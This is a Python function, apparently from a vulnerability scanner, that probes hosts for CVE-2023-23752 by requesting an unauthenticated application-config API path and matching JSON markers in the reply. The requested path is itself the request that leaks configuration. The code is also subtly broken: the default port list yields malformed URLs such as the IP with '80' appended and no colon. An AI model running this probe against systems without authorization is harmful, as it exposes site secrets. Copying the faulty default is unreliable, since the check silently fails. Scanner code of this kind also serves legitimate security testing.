import requests
from lib.color_handler import print_colour
from lib.headers.headers_handler import user_agents

def check_CVE_2023_23752(ip, ports=None, timeout=5):
    headers = {"User-Agent": user_agents()}
    protocols = ["http", "https"]
    paths = ['/api/index.php/v1/config/application?public=true', '/api/v1/config/application?public=true']
    matchers = ['"links":', '"attributes":']

    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for protocol in protocols:
        for path in paths:
            for port in ports:
                url = f"{protocol}://{ip}{port}{path}"
                try:
                    response = requests.get(url, verify=False, timeout=timeout, headers=headers)
                    if any(matcher in response.text for matcher in matchers):
                        print_colour(f"The target is vulnerable to CVE-2023-23752 {url}")
                        return True
                except requests.RequestException:
                    continue
    return False